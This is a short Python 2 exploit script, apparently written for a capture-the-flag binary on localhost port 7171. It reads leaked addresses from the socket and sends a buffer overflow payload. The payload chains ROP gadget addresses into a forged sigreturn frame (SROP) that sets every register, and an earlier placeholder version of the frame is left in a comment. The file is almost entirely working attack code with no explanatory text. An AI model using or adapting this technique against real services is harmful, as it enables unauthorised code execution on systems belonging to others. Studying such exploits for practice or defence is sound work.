from socket import create_connection
import struct

XOR_RAX_RAX   = 0x0000000000445440
SYSCALL       = 0x000000000040168a # syscall
SYSCALL_RET   = 0x000000000040116f # syscall ; ret
SIGRETURN_IND = 0x0000000000401168 # mov rax, 15; syscall; ret

def recv_n_bytes(sock, n):
    c = 0
    data = ''
    while c < n:
        data += sock.recv(1)
        c += 1
    return data

s = create_connection(("127.0.0.1", 7171))
buffer_address = recv_n_bytes(s, 8)
print repr(buffer_address)
buffer_address = struct.unpack("<Q", buffer_address)[0]
print hex(buffer_address)

page = recv_n_bytes(s, 8)
print repr(page)
page = struct.unpack("<Q", page)[0]
print hex(page)

sploit  = "\x90" * (0x40-(8*4))
sploit += "B" * 8
sploit += struct.pack("<Q", XOR_RAX_RAX)
sploit += struct.pack("<Q", SIGRETURN_IND)

"""
sploit += struct.pack("<Q", 0x4242424242424242) #rt_sigreturn
sploit += struct.pack("<Q", 0x4242424242424242) #uc_flags
sploit += struct.pack("<Q", 0x4242424242424242) #&uc
sploit += struct.pack("<Q", 0x4242424242424242) #uc_stack.ss_sp
sploit += struct.pack("<Q", 0x4242424242424242) #uc_stack.ss_flags
sploit += struct.pack("<Q", 0x4242424242424242) #uc_stack.ss_size
sploit += struct.pack("<Q", 0x4242424242424242) #r8
sploit += struct.pack("<Q", 0x4242424242424242) #r9
sploit += struct.pack("<Q", 0x4242424242424242) #r10
sploit += struct.pack("<Q", 0x4242424242424242) #r11
sploit += struct.pack("<Q", 0x4242424242424242) #r12
sploit += struct.pack("<Q", 0x4242424242424242) #r13
sploit += struct.pack("<Q", 0x4242424242424242) #r14
sploit += struct.pack("<Q", 0x4242424242424242) #r15
sploit += struct.pack("<Q", 0x4242424242424242) #rdi
sploit += struct.pack("<Q", 0x4242424242424242) #rsi
sploit += struct.pack("<Q", 0x4242424242424242) #rbp
sploit += struct.pack("<Q", 0x4242424242424242) #rbx
sploit += struct.pack("<Q", 0x4242424242424242) #rdx
sploit += struct.pack("<Q", 0x4242424242424242) #rax
sploit += struct.pack("<Q", 0x4242424242424242) #rcx
sploit += struct.pack("<Q", 0x4242424242424242) #rsx
sploit += struct.pack("<Q", 0x4242424242424242) #rip
sploit += struct.pack("<Q", 0x4242424242424242) #eflags <<<
sploit += struct.pack("<Q", 0x0000000000000033) #cs/gs/fs
sploit += struct.pack("<Q", 0x4242424242424242) #err
sploit += struct.pack("<Q", 0x4242424242424242) #trapno
sploit += struct.pack("<Q", 0x4242424242424242) #oldmask
sploit += struct.pack("<Q", 0x4242424242424242) #cr32
sploit += struct.pack("<Q", 0x4242424242424242) #fpstate
sploit += struct.pack("<Q", 0x4242424242424242) #__reserved
sploit += struct.pack("<Q", 0x4242424242424242) #sigmask
"""
sploit += struct.pack("<Q", 0x0000000000000000) # uc_flags
sploit += struct.pack("<Q", 0x0000000000000000) # &uc
sploit += struct.pack("<Q", 0x0000000000000000) # uc_stack.ss_sp
sploit += struct.pack("<Q", 0x00007fff00000002) # uc_stack.ss_flags
sploit += struct.pack("<Q", 0x0000000000000000) # uc_stack.ss_size
sploit += struct.pack("<Q", 0x0000000000000000) # r8
sploit += struct.pack("<Q", 0x00007ffff7fe5700) # r9
sploit += struct.pack("<Q", 0x0000000000000000) # r10
sploit += struct.pack("<Q", 0x0000000000000246) # r11
sploit += struct.pack("<Q", 0x0000000000400530) # r12
sploit += struct.pack("<Q", 0x00007fffffffe670) # r13
sploit += struct.pack("<Q", 0x0000000000000000) # r14
sploit += struct.pack("<Q", 0x0000000000000000) # r15
sploit += struct.pack("<Q", 0xffffffffffffffff) # rdi
sploit += struct.pack("<Q", 0x00007fffffffe588) # rsi
sploit += struct.pack("<Q", 0x00007fffffffe590) # rbp
sploit += struct.pack("<Q", 0x0000000000000000) # rbx
sploit += struct.pack("<Q", 0x0000000000000000) # rdx
sploit += struct.pack("<Q", 0x7)                # rax
sploit += struct.pack("<Q", 0xffffffffffffffff) # rcx
sploit += struct.pack("<Q", 0x00007fffffffe550) # rsp
sploit += struct.pack("<Q", 0x00007ffff7ada3c4) # rip
sploit += struct.pack("<Q", 0x0000000000000246) # eflags
sploit += struct.pack("<Q", 0x0000000000000033) # cs/gs/fs
sploit += struct.pack("<Q", 0x0000000000000000) # err
sploit += struct.pack("<Q", 0x0000000000000001) # trapno
sploit += struct.pack("<Q", 0x0000000000000000) # oldmask
sploit += struct.pack("<Q", 0x0000000000000000) # cr2
sploit += struct.pack("<Q", 0x00007fffffffe2c0) # &fpstate
sploit += struct.pack("<Q", 0x00007ffff7de4523) # __reserved
sploit += struct.pack("<Q", 0x0000000000000000) # sigmask
s.send(sploit)
